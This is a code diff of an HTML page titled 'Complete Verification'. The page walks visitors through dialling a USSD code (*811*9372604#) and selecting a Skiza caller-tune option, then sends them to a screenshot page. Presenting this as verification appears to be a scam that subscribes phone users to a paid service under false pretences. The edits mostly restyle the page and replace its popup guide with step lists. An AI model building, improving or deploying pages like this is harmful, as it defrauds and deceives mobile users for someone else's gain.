@@ -17,51 +17,51 @@
       font-family: Arial, sans-serif;
       background: #f5f5f5;
       color: #111;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
     }
 
     .container {
       width: 100%;
-      max-width: 420px;
-      background: white;
-      border-radius: 18px;
-      padding: 25px 20px;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.08);
-      text-align: center;
+      max-width: 480px;
+      margin: auto;
+      padding: 25px 18px;
     }
 
     .subtitle {
-      color: #666;
-      font-size: 15px;
+      text-align: center;
+      color: #555;
+      font-size: 16px;
       margin-bottom: 18px;
     }
 
     .step {
-      display: inline-block;
-      background: #111;
-      color: white;
-      padding: 8px 14px;
-      border-radius: 20px;
-      font-size: 13px;
+      text-align: center;
       font-weight: bold;
-      margin-bottom: 20px;
+      font-size: 14px;
+      margin-bottom: 15px;
     }
 
     h1 {
+      text-align: center;
       font-size: 25px;
-      margin: 10px 0 20px;
+      margin-bottom: 20px;
     }
 
-    .instruction {
-      background: #f4f4f4;
-      border-radius: 14px;
-      padding: 18px;
-      text-align: left;
+    .instructions {
+      background: white;
+      border-radius: 15px;
+      padding: 20px;
+      box-shadow: 0 3px 12px rgba(0,0,0,0.08);
       line-height: 1.6;
       margin-bottom: 20px;
+    }
+
+    .instructions h2 {
+      font-size: 19px;
+      margin-top: 0;
+    }
+
+    .step-item {
+      margin: 12px 0;
     }
 
     .dial-btn,
@@ -70,11 +70,13 @@
       width: 100%;
       padding: 15px;
       border-radius: 12px;
+      text-align: center;
       text-decoration: none;
       font-size: 17px;
       font-weight: bold;
-      text-align: center;
       margin-top: 12px;
+      border: none;
+      cursor: pointer;
     }
 
     .dial-btn {
@@ -83,94 +85,22 @@
     }
 
     .continue-btn {
-      background: #ddd;
-      color: #777;
+      background: #111;
+      color: white;
+      opacity: 0.5;
       pointer-events: none;
     }
 
     .continue-btn.enabled {
-      background: #111;
-      color: white;
+      opacity: 1;
       pointer-events: auto;
     }
 
     .note {
-      margin-top: 15px;
-      color: #777;
-      font-size: 13px;
-    }
-
-    /* FIRST INSTRUCTION POPUP */
-
-    .ussd-guide {
-      display: none;
-      position: fixed;
-      inset: 0;
-      z-index: 9999;
-      background: rgba(0,0,0,0.75);
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    .guide-box {
-      width: 100%;
-      max-width: 360px;
-      background: white;
-      border-radius: 20px;
-      padding: 25px 20px;
       text-align: center;
-      box-shadow: 0 10px 35px rgba(0,0,0,0.35);
-    }
-
-    .guide-arrow {
-      font-size: 60px;
-      font-weight: bold;
-      animation: arrowBounce 0.9s infinite;
-    }
-
-    .guide-box h2 {
-      margin: 10px 0;
-      font-size: 28px;
-    }
-
-    .guide-box p {
-      font-size: 17px;
-      line-height: 1.5;
-    }
-
-    .guide-option {
-      background: #f2f2f2;
-      border-radius: 12px;
-      padding: 15px;
-      margin: 18px 0;
-      font-size: 16px;
-    }
-
-    .guide-box button,
-    .dial-phone-btn {
-      display: block;
-      width: 100%;
-      border: none;
-      border-radius: 12px;
-      padding: 14px;
-      background: #111;
-      color: white;
-      font-size: 17px;
-      font-weight: bold;
-      text-decoration: none;
-      text-align: center;
-      margin-top: 15px;
-    }
-
-    @keyframes arrowBounce {
-      0%, 100% {
-        transform: translateY(0);
-      }
-
-      50% {
-        transform: translateY(10px);
-      }
+      color: #666;
+      font-size: 14px;
+      margin-top: 12px;
     }
   </style>
 </head>
@@ -189,113 +119,62 @@
 
     <h1>📞 Complete Verification</h1>
 
-<div class="instruction">
-  Tap <strong>DIAL CODE</strong> below to continue.
-  <br><br>
+    <div class="instructions">
 
-  <strong>After tapping DIAL CODE:</strong><br>
-  Your phone dialer will open.<br>
-  Tap <strong>Call</strong>.<br>
-  When the USSD menu appears, select:<br><br>
+      <h2>Before you continue:</h2>
 
-  <strong>1 — Skiza: Entertain all your callers</strong><br><br>
+      <div class="step-item">
+        <strong>1.</strong> Tap <strong>DIAL NOW</strong>.
+      </div>
 
-  Then tap <strong>Send</strong>.
-</div>
-    <!-- DIAL CODE -->
+      <div class="step-item">
+        <strong>2.</strong> Your phone dialer will open.
+      </div>
+
+      <div class="step-item">
+        <strong>3.</strong> Tap <strong>Call</strong>.
+      </div>
+
+      <div class="step-item">
+        <strong>4.</strong> When the USSD menu appears, select:
+        <br><br>
+        <strong>1 — Skiza: Entertain all your callers</strong>
+      </div>
+
+      <div class="step-item">
+        <strong>5.</strong> Tap <strong>Send</strong> and complete the process.
+      </div>
+
+      <div class="step-item">
+        <strong>6.</strong> Return to this website and tap <strong>CONTINUE</strong>.
+      </div>
+
+    </div>
+
+
+    <!-- DIAL NOW -->
 
     <a
       class="dial-btn"
-      href="javascript:void(0)"
-      onclick="showDialGuide()"
+      href="tel:*811*9372604%23"
+      onclick="enableContinue()"
     >
-      📞 DIAL CODE
+      📞 DIAL NOW
     </a>
+
 
     <!-- CONTINUE -->
 
     <a
-      class="continue-btn"
-      href="next2.html"
       id="continueBtn"
-      onclick="return checkContinue()"
+      class="continue-btn"
+      href="screenshot.html"
     >
       CONTINUE
     </a>
 
     <div class="note">
-      Complete the USSD step before continuing.
-    </div>
-
-  </div>
-
-
-  <!-- FIRST INSTRUCTION -->
-
-  <div id="ussdGuide" class="ussd-guide">
-
-    <div class="guide-box">
-
-      <div class="guide-arrow">↓</div>
-
-      <h2>Enter 1</h2>
-
-      <p>
-        When the USSD menu appears:
-      </p>
-
-      <div class="guide-option">
-        <strong>1: Skiza</strong><br>
-        Entertain all your callers
-      </div>
-
-      <p>
-        Type <strong>1</strong>, then tap <strong>Send</strong>.
-      </p>
-
-      <button onclick="closeUSSDGuide()">
-        GOT IT
-      </button>
-
-    </div>
-
-  </div>
-
-
-  <!-- SECOND INSTRUCTION -->
-
-  <div id="dialGuide" class="ussd-guide">
-
-    <div class="guide-box">
-
-     <div class="guide-box">
-
-  <div class="guide-arrow">↓</div>
-
-  <h2>📞 Next Step</h2>
-
-  <p>
-    Your phone's USSD menu will open.
-  </p>
-
-  <p>
-    <strong>Tap Call</strong>, then:
-  </p>
-
-  <div class="guide-option">
-    <strong>Type 1</strong><br>
-    Skiza — Entertain all your callers
-  </div>
-
-  <p>
-    Then tap <strong>Send</strong>.
-  </p>
-
-  
-
-</div> 
-  
-
+      Complete the USSD process before continuing.
     </div>
 
   </div>
@@ -303,47 +182,30 @@
 
   <script>
 
-  let dialCodeClicked = false;
+    function enableContinue() {
+
+      localStorage.setItem("dialCompleted", "true");
+
+      document
+        .getElementById("continueBtn")
+        .classList.add("enabled");
+
+    }
 
 
- /*
-  DIAL CODE button
-*/
+    window.addEventListener("pageshow", function() {
 
-function showDialGuide() {
+      if (localStorage.getItem("dialCompleted") === "true") {
 
-  localStorage.setItem("dialCodeClicked", "true");
-  window.location.href = "tel:*811*9372604%23";
+        document
+          .getElementById("continueBtn")
+          .classList.add("enabled");
 
-} 
+      }
 
-
-
-  /*
-    OPEN PHONE button
-  */
-
-  
-
-
-  /*
-    CONTINUE button
-  */
-
-  function checkContinue() {
-
-  if (localStorage.getItem("dialCodeClicked") !== "true") {
-
-    alert("Please tap DIAL CODE and complete the USSD step first.");
-
-    return false;
-
-  }
-
-  window.location.href = "next2.html";
-
-  return false;
-
-}
+    });
 
   </script>
+
+</body>
+</html>
